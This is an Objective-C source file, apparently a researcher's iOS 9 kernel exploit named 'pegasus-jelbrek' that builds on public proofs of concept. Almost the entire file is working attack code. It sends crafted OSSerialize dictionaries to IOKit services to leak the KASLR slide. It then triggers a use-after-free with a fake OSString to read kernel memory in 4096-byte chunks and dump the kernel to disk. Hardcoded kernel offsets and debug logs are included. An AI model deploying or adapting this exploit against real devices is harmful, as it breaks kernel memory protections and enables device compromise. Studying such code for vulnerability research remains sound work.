//
//  main.m
//  pegasus-jelbrek
//
//

#import <UIKit/UIKit.h>
#include <sys/mman.h>
#import <Foundation/Foundation.h>
#import <sys/syscall.h>
#import <dlfcn.h>
#include <mach-o/nlist.h>
#include <mach-o/dyld.h>
#include <sys/mman.h>
#include <mach/mach.h>

#include <IOKit/IOKitLib.h>
#include <IOKit/iokitmig.h>

#define kOSSerializeBinarySignature "\323\0\0"

//THe following two macros are from https://github.com/saelo/ios-kern-utils/blob/master/tools/kdump.c

#define CMD_ITERATE(hdr, cmd) \
for(struct load_command *cmd = \
(struct load_command *) ((hdr) + 1), \
*end = (struct load_command *) ((char *) cmd + (hdr)->sizeofcmds); \
cmd < end; \
cmd = (struct load_command *) ((char *) cmd + cmd->cmdsize))

#define max(a, b) (a) > (b) ? (a) : (b)


// GLOBALS
uint64_t osstring_leak=0;
uint64_t kerntext_leak=0;

char buffer[0x1000] = {0};

uint32_t size = sizeof(buffer);

pthread_mutex_t mutex;


enum {
    kOSSerializeDictionary   = 0x01000000U,
    kOSSerializeArray        = 0x02000000U,
    kOSSerializeSet          = 0x03000000U,
    kOSSerializeNumber       = 0x04000000U,
    kOSSerializeSymbol       = 0x08000000U,
    kOSSerializeString       = 0x09000000U,
    kOSSerializeData         = 0x0a000000U,
    kOSSerializeBoolean      = 0x0b000000U,
    kOSSerializeObject       = 0x0c000000U,
    kOSSerializeTypeMask     = 0x7F000000U,
    kOSSerializeDataMask     = 0x00FFFFFFU,
    kOSSerializeEndCollection = 0x80000000U,
};



//RM: Zheng Min's exploit
uint64_t * kslide_infoleak()
{
    static uint64_t kslide=0;

    NSLog(@"getting kslide...\n");
    
    kern_return_t err,kr;
    io_iterator_t iterator;
    static mach_port_t service = 0;
    io_connect_t cnn = 0;
    io_object_t obj=0;
    io_iterator_t iter;
    mach_port_t master = 0, res;
    
    //<dict><key>min</key><number>0x4141414141414141</number></dict>
    uint32_t data[] = {
        0x000000d3,
        0x81000001,
        0x08000004, 0x006e696d,
        0x84000200,    //change the length of OSNumber
        0x41414141, 0x41414141
    };
    
    IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("AppleKeyStore"), &iterator);
    service = IOIteratorNext(iterator);
    
    
    kr = io_service_open_extended(service, mach_task_self(), 0, NDR_record, (char*)data, sizeof(data), &err, &cnn);
    NSLog(@"Error in UC Clinet is %x %x\n\n", err, cnn);
    if (kr!=0)
    {
        NSLog(@"Cannot create service.\n");
        return 0;
    }
    
    IORegistryEntryCreateIterator(service, "IOService", kIORegistryIterateRecursively, &iter);
    io_object_t object = IOIteratorNext(iter);
    
    char search_str[100] = {0};
    
    sprintf(search_str, "pid %d", getpid());
    
    char buffer[0x200] = {0};
    
    while (object != 0)
    {io_buf_ptr_t buf_prop=NULL;
        mach_msg_type_number_t bufCnt = 0;
        
        kr= io_registry_entry_get_properties(object,&buf_prop,&bufCnt);
        // kr=io_registry_entry_get_name(object,buf_prop);
        if (kr == KERN_SUCCESS) {
            // NSLog(@"%s %x\n\n\n",buf_prop,bufCnt);
        }
        else{
            NSLog(@"Couldnt get the name of the registry entry %x\n\n\n", kr);
        }

        uint32_t size = sizeof(buffer);
        if (IORegistryEntryGetProperty(object, "IOUserClientCreator", buffer, &size) == 0)
        {
            //NSLog(@"In Here1");
            if (strstr(buffer, search_str) != NULL)
            {
               // NSLog(@"In Here2");
                memset(buffer,0, 0x200);
                size=0x300;
                
                /*RM:
                 
                 */
                                if ((kr = io_registry_entry_get_property_bytes(object, "min", buffer, &size))==0)
                {
                    for (uint32_t k = 0; k < 128; k += 8) {
                        //NSLog(@"%#llx\n", *(uint64_t *)(buffer + k));
                    }
                    //cacluate the kslide
                    kslide = *((unsigned long long*)&buffer[8])-0xffffff800453a000; //iOS 9.2  ip touch 6g is_io_get_properties_bytes() address hardcoded
                    NSLog(@"kslide=0x%llx\n",kslide);
                    
                    break;
                }
                else
                    NSLog(@"%x",kr);
            }
        }
        IOObjectRelease(object);
        object = IOIteratorNext(iter);
    }
    
    if (object!=0)
        IOObjectRelease(object);
    
//static array holding the leaked addresses
    osstring_leak=kslide+0xffffff80044f3168; //OSString vtab** slid
    kerntext_leak=kslide+0xffffff8004004000; //Kernel Text base Slid
    return 0;
}




//original ~jndok's exploit KASLR
uint64_t kslide_infoleak5(void)
{
    kern_return_t kr = 0, err = 0;
    mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL;
    
    io_service_t serv = 0;
    io_connect_t conn = 0;
    io_iterator_t iter = 0;
    
    uint64_t kslide = 0;
    
    void *dict = calloc(1, 512);
    uint32_t idx = 0; // index into our data
    
#define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0)
    
    WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning
    
    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // dictionary with two entries
    
    WRITE_IN(dict, (kOSSerializeSymbol | 4)); // key with symbol, 3 chars + NUL byte
    WRITE_IN(dict, (0x00414141)); // 'AAA' key + NUL byte in little-endian
    
    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); // value with big-size number
    WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); // at least 8 bytes for our big number
    
    
    host_get_io_master(mach_host_self(), &master); // get iokit master port
    
    kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &res);
    if (kr == KERN_SUCCESS) {
        NSLog(@"(+) Dictionary is valid! Spawning user client...\n");
    } else
        return -1;
    
    serv = IOServiceGetMatchingService(master, IOServiceMatching("AppleKeyStore"));

    kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &err, &conn);
    if (kr == KERN_SUCCESS) {
        NSLog(@"(+) UC successfully spawned! Leaking bytes...\n");
    } else
        return -1;
    
    IORegistryEntryCreateIterator(serv, "IOService", kIORegistryIterateRecursively, &iter);
    io_object_t object = IOIteratorNext(iter);
    
    char buf[0x200] = {0};
    mach_msg_type_number_t bufCnt = 0x200;
    
    kr = io_registry_entry_get_property_bytes(object, "AAA", (char *)&buf, &bufCnt);
    if (kr == KERN_SUCCESS) {
        NSLog(@"(+) Done! Calculating KASLR slide...\n");
    } else
    {
        NSLog(@"(+)Error in getting property bytes %x %s\n",kr, buf);
        return -1;
    }
//#if 0
    for (uint32_t k = 0; k < 128; k += 8) {
        NSLog(@"%#llx\n", *(uint64_t *)(buf + k));
    }
//#endif
    
    uint64_t hardcoded_ret_addr = 0xffffff80003934bf;
    
    kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr;
    
    NSLog(@"(i) KASLR slide is %#016llx\n", kslide);
    
    return kslide;
}



//RM: my hacked up version trying to debug ~jndok's poc
uint64_t kslide_infoleak3(void)
{
    kern_return_t kr = 0, err = 0;
    mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL;
    
    io_service_t serv = 0;
    io_connect_t conn = 0;
    io_iterator_t iter = 0;
    
    uint64_t kslide = 0;
    
    void *dict = calloc(1, 512);
    uint32_t idx = 0; // index into our data
    
#define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0)
    
    WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning
    
    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // dictionary with two entries
    
    WRITE_IN(dict, (kOSSerializeSymbol | 4)); // key with symbol, 3 chars + NUL byte
    WRITE_IN(dict, (0x00414141)); // 'AAA' key + NUL byte in little-endian
    
    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); // value with big-size number
    WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); // at least 8 bytes for our big number
 
    
    
    uint32_t dict1[] = {
        0x000000d3,
        0x81000001,
        (kOSSerializeSymbol | 4), 0x00414141,
        0x84000200,    //change the length of OSNumber
        0x41414141, 0x41414141
    };
    
    host_get_io_master(mach_host_self(), &master); // get iokit master port
    
    kr = io_service_get_matching_services_bin(master, (char*)dict1, idx, &res);
    if (kr == KERN_SUCCESS) {
        NSLog(@"(+) Dictionary is valid! Spawning user client...\n");

    } else
    {    NSLog(@"(+) INVALID DICTIONARY\n");
    return -1;}

      io_iterator_t iterator;
    serv = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleCLCD"));
    NSLog(@"(+) IoServiceGetMAtchingService successful...\n");
    kr=io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict1, sizeof(dict1), &err, &conn);

    if ((err == KERN_SUCCESS)&& (kr== KERN_SUCCESS)) {
        NSLog(@"(+) UC successfully spawned! Leaking bytes...%x  %x\n",err, conn);

    } else
    {
        NSLog(@"(+) UC faileddd!...Err: %x  Conn: %x Return kern_return_t %x\n",err, conn, kr);

        return -1;
    }
    
    kr = IORegistryEntryCreateIterator(serv, "IOService", kIORegistryIterateRecursively, &iter);
    io_object_t object = IOIteratorNext(iter);

    
    if (kr == KERN_SUCCESS) {
        NSLog(@"(+) IORegistryEntryCreateIterator Succeded...\n");
        
    } else
    {     NSLog(@"(+) IORegistryEntryCreateIterator Failed...%x\n",kr);
        return -1;
    }

    /*    kern_return_t is_io_registry_entry_set_properties
     (
     io_object_t registry_entry,
     io_buf_ptr_t properties,
     mach_msg_type_number_t propertiesCnt,
     kern_return_t * result) */

    char buf[0x200] = {0};
    io_buf_ptr_t buf_prop=NULL;
    mach_msg_type_number_t bufCnt = 0x200;
    
  
 
do    {

    kr= io_registry_entry_get_properties(object,&buf_prop,&bufCnt);
   // kr=io_registry_entry_get_name(object,buf_prop);
    if (kr == KERN_SUCCESS) {
    NSLog(@"%s\n\n",buf_prop);
    }
    else{
        NSLog(@"Couldnt get the name of the registry entry %x\n\n\n", kr);
        continue;
    }
    bufCnt=0x200; //RM:  reset bufCnt
    kr = io_registry_entry_get_property_bytes(object, "AAA", (char *)&buf, &bufCnt); //RM: kern_return_t
        
        if (kr == KERN_SUCCESS) {
            NSLog(@"(+) Done! Calculating KASLR slide...\n");
            uint64_t hardcoded_ret_addr = 0xffffff80003934bf;
            
            kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr;
            
            NSLog(@"(i) KASLR slide is %#016llx\n", kslide);
            NSLog(@"(i) KASLR slide is %#016llx\n", kslide);
            return kslide;
        }
        else{
    NSLog(@"(+) Failed to read io_registry_entry_get_property_bytes !!!...%x\n\n\n",kr); //RM:  #define kIOReturnNoResources     iokit_common_err(0x2be) // resource shortage   why is it returning this???
            //return 0;
        }

        object = IOIteratorNext(iter);
            
}while (object!=0);
    
#if 0
    for (uint32_t k = 0; k < 128; k += 8) {
        NSLog(@"%#llx\n", *(uint64_t *)(buf + k));
    }
#endif
    

    return 0;
    
}

//thanks s1guza
/*
 typedef void** vtab_t;

typedef struct
{
    vtab_t       vtab;
    int          retainCount;
    void       * data;
    unsigned int length;
    unsigned int capacity;
    unsigned int capacityIncrement;
    void       * reserved;
} OSData;
 */

/*
 
 typedef void** vtab_t;
 
 typedef struct
 {
 vtab_t       vtab;
 int          retainCount;
 unsigned int flags;
 unsigned int length;
 char       * string;
 } OSString;
 */



//zheng min
void use_after_free(void)
{
    printf("exploit the kernel...\n");
    
    //char * data = malloc(1024);
    char * data1 = malloc(512);  //New buffer to hold the properties dict
  //  char * data2 = malloc(1024);
    
    
    uint32_t bufpos1,bufpos2 = 0;
    mach_port_t master = 0, res;
    kern_return_t kr;
    
    /*
     Plan: open lots of services via io_service_open_extended but with the dict only having a single string. 
     Then free alternate string(by calling io_service_close) on multiple connections. this will hopefully cause 
     the desired layout of |freed string| valid string|freed string| valid string|.....
     Now do the regular uaf trigger by making another service with a dict with a string that will get freed and 
     then trigger the retain call on this freed string(dont reallocate using OSdata). the vtab pointer of this freed 
     string would actually be a next pointr in the kalloc.32 free list. the retain call would thus resolve to the actual vtab of a valid osstring(hopefully placed right after a freed string) because retain is vtab[4] which is 32 bytes from 
     the start of the vtable * address. This *should* give you a kernel panic with pc/far pointing to the vtab of the 
     actual valid string. this will be n the _DATA.const section.  of course you can calculate the unslid address be 
     using the kaslr before this and subtracting the slide . next boot, just trigger kaslr, find the slide and add to 
     the base address of the expected DATA.const vtab pointer for OSString class. use this vtab for that particular execution and trigger the normal UAF with OSData buffer containing the valid vtable and the char* of the 
     string(confused as a member within OSData) to be pointing to the kernel base address+slide. and boom leak 
     4096 bytes at a time. (also set the length to 0xfff in OSdata i.e length of OSString's char * )
     */
    
    
    kern_return_t err;
    static mach_port_t service = 0;
    //io_connect_t  cnn[500] ;
    io_iterator_t iter;

    //DICT for UAF Trigger
    /* create header */
    
    memcpy(data1, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
    bufpos2 += sizeof(kOSSerializeBinarySignature);
    
    //<dict><string>A</string><bool>true</bool><key>B</key><object>1</object></dict>   --> Notice how we havent reallocated freed OSstring with OSData----> This is to abuse the type confusion of a freed OSString element with a valid OSString element -- to confuse its next pointer to be a vtable ** pointer and cause a dereference
    *(uint32_t *)(data1+bufpos2) = kOSSerializeDictionary | 0x80000000 | 0x8; bufpos2 += 4; //0
    
    *(uint32_t *)(data1+bufpos2) = kOSSerializeString | 0x02; bufpos2 += 4;   //1 string "A"
    *(uint32_t *)(data1+bufpos2) = 0x00000041; bufpos2 += 4;
    *(uint32_t *)(data1+bufpos2) = kOSSerializeBoolean | 0x1; bufpos2 += 4;   //2 bool  "true"
    
    *(uint32_t *)(data1+bufpos2) = kOSSerializeSymbol | 0x2; bufpos2 += 4;   //3 symbol "B"
    *(uint32_t *)(data1+bufpos2) = 0x00000042; bufpos2 += 4;  
    *(uint32_t *)(data1+bufpos2) = kOSSerializeEndCollection | kOSSerializeObject | 0x1; bufpos2 += 4;

    
    //UAF trigger CODE BELOW 

    //NSLog(@"Triggering the UAF...................... !\n");
   // usleep(4000);

    host_get_io_master(mach_host_self(), &master);

   
    kr = io_service_get_matching_services_bin(master, data1, bufpos2, &res); //trigger the UAF vul
    //kr = io_service_open_extended(service, mach_task_self(), 0, NDR_record, (char*)data1, bufpos2, &err, &cnn[54]); //dict with 100 strings


    if (kr == KERN_SUCCESS) {
        NSLog(@"(+) Dictionary is valid! ........\n");
    } else{
        NSLog(@"Uh OH! DICT is invalid! ........\n");
        
        exit(0);
    }

    
}


//jndok
void use_after_free1(uint64_t address, unsigned int bytes)
{
   
   // NSLog(@"[*] Triggering UAF with address %llu and bytes %d",address,bytes);

    kern_return_t kr = 0;
    mach_port_t master = MACH_PORT_NULL;
    
    /* craft the dictionary */
    
  //  NSLog(@"(i) Crafting dictionary...\n");
    
    void *dict = calloc(1, 512);
    uint32_t idx = 0; // index into our data
    

    static mach_port_t service = 0;
    io_iterator_t iter;
    kr=IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("AppleMobileFileIntegrity"), &iter);  //AppleMobileFileIntegrity to the rescue!!
    service = IOIteratorNext(iter);
    if (kr!=0)
    {
        NSLog(@"Error OPening Service AppleKeyStore/AppleMobileFileIntegrity is %x \n\n", kr);
        return;
    }
    
    io_connect_t conn[100];
    kern_return_t err;

    
    /*
     typedef struct
     {
     vtab_t       vtab;
     int          retainCount;
     unsigned int flags;
     unsigned int length;
     char       * string;
     } OSString;
     
    */
    
    
    
    
    uint32_t osstring_vtabLSB;
    uint32_t osstring_vtabMSB;
    
    uint32_t kerntext_LSB;
    uint32_t kerntext_MSB;
    
    osstring_vtabLSB = osstring_leak & 0xFFFFFFFF;
    osstring_vtabMSB = (osstring_leak & 0xFFFFFFFF00000000) >> 32;
    
    if (!(address))     //RM: If no argument was passed to the function that means we are dumping the kernel header so use the leaked global value of kernel text base
    {
    kerntext_LSB = kerntext_leak & 0xFFFFFFFF;
    kerntext_MSB = (kerntext_leak & 0xFFFFFFFF00000000) >> 32;
    }
    else   //use the address provided by the function input
    {
        kerntext_LSB = address & 0xFFFFFFFF;
        kerntext_MSB = (address & 0xFFFFFFFF00000000) >> 32;
    }
    
#define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0)
    
    WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning
    
    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 8)); // dict with 6 entries
    
    WRITE_IN(dict, (kOSSerializeString | 4));   // OSString object tht poibts to 'AAA', will get freed
    WRITE_IN(dict, (0x00414141));
    
    WRITE_IN(dict, (kOSSerializeBoolean | 1));  // bool, true
    
    WRITE_IN(dict, (kOSSerializeSymbol | 4));   // symbol 'BBB'
    WRITE_IN(dict, (0x00999900));
    
    WRITE_IN(dict, (kOSSerializeData | 32));    // data (0x00 * 32)
    WRITE_IN(dict, (osstring_vtabLSB));
    WRITE_IN(dict, (osstring_vtabMSB)); //vtab
    WRITE_IN(dict, (0x00000100)); //retaincount  -->careful not to make it >=0xFFFF because the retain/refcount functions check that the refcount is not already max=0xffff. interestingly this message shows up in the panic logs ! OSObject.cpp --> "Attempting to retain and already freed object"
    WRITE_IN(dict, (0x00000001));//flags -kOSStringNoCopy  -->the string buffer itself.."AAA"/OSData buf controlled by us wont get freed if this is set.
    WRITE_IN(dict, (0x00001000)); //length
    WRITE_IN(dict, (0x00000000));  //??  padding for the 64 bit char * buf
    WRITE_IN(dict, (kerntext_LSB)); //char * string
    WRITE_IN(dict, (kerntext_MSB));  //char * string starts here?
    
    WRITE_IN(dict, (kOSSerializeSymbol | 4));   // symbol 'CCC'
    WRITE_IN(dict, (0x00434343));

    WRITE_IN(dict, (kOSSerializeObject | 1));   // ref to object 1 (OSString)
 
    WRITE_IN(dict, (kOSSerializeSymbol | 4));   // symbol 'CCC'
    WRITE_IN(dict, (0x00444444));
    
    WRITE_IN(dict, (kOSSerializeEndCollection| kOSSerializeObject | 4));   // ref to object 4 (OSData)
   
    
    host_get_io_master(mach_host_self(), &master); // get iokit master port
    

    usleep(1000000);

    io_service_open_extended(service, mach_task_self(), 0, NDR_record, (char*)dict, idx, &err, &conn[0]);

 
   // IORegistryEntryGetProperty(
   //                            io_registry_entry_t	entry,
   //                            const io_name_t		propertyName,
   //                            io_struct_inband_t	buffer,
   //                            uint32_t	      * size );

    
    IORegistryEntryCreateIterator(service, "IOService", kIORegistryIterateRecursively, &iter);
    io_object_t object = IOIteratorNext(iter);
    
    
    char search_str[100] = {0};
    
    sprintf(search_str, "pid %d", getpid());
    
    
    while (object != 0)
    {

        if (strstr(buffer, search_str) == NULL)
    {
                
               // NSLog(@"In Here2\n\n");
                //bcopy( bytes, buf, len ); in io_registry_entry_get_property_bytes()
                //Use crafted OSNumber to leak stack information of the kernel
                
      //reset the temporary buffer that holds the recently leaked bytes. after return from this function the caller should make sure to copy them .We write the bytes to disk.
        memset(buffer,0, 0x1000);
        size=0x1000;
        
        
        if (((kr = io_registry_entry_get_property_bytes(object, "CCC", buffer, &bytes))==0));  //RM: leak the number of bytes as dictated by the argument
        
  
        else
          NSLog(@"Error in getting bytes %x",kr);
           // }
        }
        
        
        //IOObjectRelease(object);
        object = IOIteratorNext(iter);
    }
    NSLog(@"Read Property bytes!");
 //   fclose(fp);
  //  fp = NULL;
    if (object!=0)
        IOObjectRelease(object);

}

void use_after_free_backup(void)
{
    kern_return_t kr = 0;
    mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL;
    
    /* craft the dictionary */
    
    NSLog(@"(i) Crafting dictionary...\n");
    
    void *dict = calloc(1, 512);
    uint32_t idx = 0; // index into our data
    
#define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0)
    
    WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning
    
    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 6)); // dict with 6 entries
    
    WRITE_IN(dict, (kOSSerializeString | 4));   // string 'AAA', will get freed
    WRITE_IN(dict, (0x00414141));
    
    WRITE_IN(dict, (kOSSerializeBoolean | 1));  // bool, true
    
    WRITE_IN(dict, (kOSSerializeSymbol | 4));   // symbol 'BBB'
    WRITE_IN(dict, (0x00424242));
    
    WRITE_IN(dict, (kOSSerializeData | 32));    // data (0x00 * 32)
    WRITE_IN(dict, (0x0424242));
    WRITE_IN(dict, (0x0424242));
    WRITE_IN(dict, (0x0424242));
    WRITE_IN(dict, (0x0424242));
    WRITE_IN(dict, (0x0424242));
    WRITE_IN(dict, (0x0424242));
    WRITE_IN(dict, (0x0424242));
    WRITE_IN(dict, (0x0424242));
    
    WRITE_IN(dict, (kOSSerializeSymbol | 4));   // symbol 'CCC'
    WRITE_IN(dict, (0x00434343));
    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeObject | 1));   // ref to object 1 (OSString)
 
    
    NSLog(@"(+) All done! Triggering the bug!\n");
    
    host_get_io_master(mach_host_self(), &master); // get iokit master port
    
    kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &res);
    if (kr != KERN_SUCCESS)
        return;
}


void write_to_file(void *src_buffer,unsigned int bytes_to_write)
{
    
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *documentsDirectory = [paths objectAtIndex:0];
    NSString *appFile = [documentsDirectory stringByAppendingPathComponent:@"kerneldump"];
    
    NSFileManager *fileManager = [[NSFileManager alloc]init];
    char const *path = [fileManager fileSystemRepresentationWithPath:appFile];
    
FILE * fp=NULL;
fp = fopen(path, "ab+");
if (fp ==NULL)
{
    NSLog(@"Failed to open file !\n");
}
int cnt=0;
cnt= fwrite ((src_buffer) , 1 , bytes_to_write , fp );
usleep(800000);

if (cnt!=0)
{
    NSLog(@"Wrote %d bytes into the log file\n",cnt);
    //usleep(5000);
}
else
NSLog(@"COULDNT WRITE BYTES!");
fclose(fp);
fp = NULL;
usleep(800000);
}



int main(int argc, const char * argv[]) {
    
    
    struct segment_command_64* seg;
    size_t filesize=0;

    
    kslide_infoleak(); //Trigger the KASLR leak and store the leaked kern text base and leaked OSString(offset for OSString hardcoded) in globals.
    
    if ((osstring_leak !=0) && (kerntext_leak !=0))
    {
        
        NSLog(@"OSString vtab ** (slid) %llx\n",osstring_leak);
        NSLog(@"Kernel Text Base (slid) %llx\n",kerntext_leak);
    }
    else
    {
        NSLog(@"KASLR leak failed!");
        return 0;
    }

    //dump 4096/0x1000 bytes a time by triggering the UAF...
    //NSLog(@"CALLING UAF TO DUMP BYTES attempt");
    NSLog((@"Dumping Kernel Header...\n"));

        use_after_free1(0,4096);  //RM: pass in address and number of bytes to dump. For the header pass in 0 and 4096(MIG_MAx_SIZE) so the function will use the global KASLR kern txt base leak. if dumping segemnts and sections after the header pass in the specifc address as parsed by the header.
        //write_to_file(buffer,4096);
        //wait for a while to cause a flush and the write to disk by the kernels thread.
        //usleep(50000000);
    //RM: Check that dumping worked.
        char header_temp[4096];
    memcpy(header_temp,buffer,4096);  //RM: MAKE A COPY OF THE HEADER BUFFER> because 'buffer' is a global buffer which gets written to (bytes read ) everytime use_after_free1  is called
    struct mach_header_64* orig_hdr = (struct mach_header_64*)header_temp;
    //struct mach_header_64* hdr = (struct mach_header_64*)header_temp;

    
    if(!(MH_MAGIC_64 == orig_hdr->magic))
    {
        NSLog((@"HEADER COULDNT BE DUMPED..! QUITTING\n"));
        exit(0);
    }
    
    uint8_t * kernel_dump=malloc(4096);
    memset(kernel_dump,0,4096);
    
    //RM: Calculate segment addresses and sizes and sections one by one
    uint64_t total_copied=5763072	;

    char temp_name[200];
    uint64_t temp_addr = kerntext_leak; //__TEXT
    filesize=0x4e0000+0x58000+0x4000+0x4000+0x5c000; //sizes of segments__TEXT, __DATA, __KLD, __LAST, __LINKEDIT
    //0x4e0000+0x58000+0x4000+0x4000; //__TEXT, __DATA, __KLD, __LAST
    for (uint64_t k=total_copied; k< filesize; k=k+4096)
    {
        NSLog(@"[*] Leaking bytes from address %llx\n",temp_addr+k);
        use_after_free1((temp_addr+k),4096);
        memcpy(kernel_dump,buffer,4096);
        write_to_file(kernel_dump, 4096);
       // NSLog(@"[*] Dumped %zu bytes of segment %s",total_copied,temp_name);
        memset(buffer,0,4096);

        
    }
     
    
    NSLog(@"[*] Successfully parsed kernel segments and copied to Local file. Now writing to file!\n\n");
    //write_to_file(kernel_dump,filesize); //write the final kernel_dump to disk
    //wait for a while to cause a flush and the write to disk by the kernels thread.
    usleep(50000000);
    
    NSLog(@"[*] Finsished ! Exiting! Or Panic'ing ;p");


    /*
     FOLLOWING IS THE KASLR LEAK and the leaked, slid return address(address slid of is_io_get_property_bytes)
     <dict ID="0"><key>min</key><integer size="512" ID="1">0x4141414141414141</integer><key>IOUserClientCreator</key><string ID="2">pid 345, pegasus-jelbrek</string></dict> a8
     
     
     2016-11-11 19:18:30.807 pegasus-jelbrek[345:191237] In Here1
     2016-11-11 19:18:30.807 pegasus-jelbrek[345:191237] In Here2
     2016-11-11 19:18:30.809 pegasus-jelbrek[345:191237] 0x4141414141414141
     2016-11-11 19:18:30.809 pegasus-jelbrek[345:191237] 0xffffff8022f3a000  -->Return address? so is_io_get_property_bytes

     2016-11-11 19:18:30.809 pegasus-jelbrek[345:191237] 0xff002bf1
     2016-11-11 19:18:30.809 pegasus-jelbrek[345:191237] 0xffffff80016485cc
     2016-11-11 19:18:30.809 pegasus-jelbrek[345:191237] 0xffffff800369afb4
     2016-11-11 19:18:30.810 pegasus-jelbrek[345:191237] 0xffffff8003190180
     2016-11-11 19:18:30.810 pegasus-jelbrek[345:191237] 0xffffff80016485a0
     2016-11-11 19:18:30.810 pegasus-jelbrek[345:191237] 0xffffff8020923940
     2016-11-11 19:18:30.810 pegasus-jelbrek[345:191237] 0
     2016-11-11 19:18:30.811 pegasus-jelbrek[345:191237] 0
     2016-11-11 19:18:30.811 pegasus-jelbrek[345:191237] 0
     2016-11-11 19:18:30.811 pegasus-jelbrek[345:191237] 0
     2016-11-11 19:18:30.811 pegasus-jelbrek[345:191237] 0
     2016-11-11 19:18:30.811 pegasus-jelbrek[345:191237] 0
     2016-11-11 19:18:30.815 pegasus-jelbrek[345:191237] 0
     2016-11-11 19:18:30.815 pegasus-jelbrek[345:191237] 0
     
     
     and the UAF panics at a retain call of 0x42424242
     kernel slide: 0x06400000
     kernel text base(slid) : 0xffffff800a404000 lr: 0xffffff800a7e56ec far: 0x04242420042424262 pc: 0xffffff800a7e5520 ?
     
     so unslid address of is_io_get_property_bytes is 0xffffff800453a000
     and therefore from the next time kaslr_leak() will give a return address of is_io_prop_get_bytes which will be slid but you can subtract 0xffffff800333b940 to get the slide.
     unslid (constant) kernel text base: 0xffffff8004004000
     hex(0xffffff800ecf3168-0xa800000)   --->hopefully this is the address of the vtab ** within DATA_Const of the kernel for OSString class.
     '0xffffff80044f3168'  0xa800000 is the slide for that execution    for siguza 0xffffff80044ef1f0 was the vtab ** but he was on 9.3.3 on a diff device.
     
    
     */
    
    return 0;
}
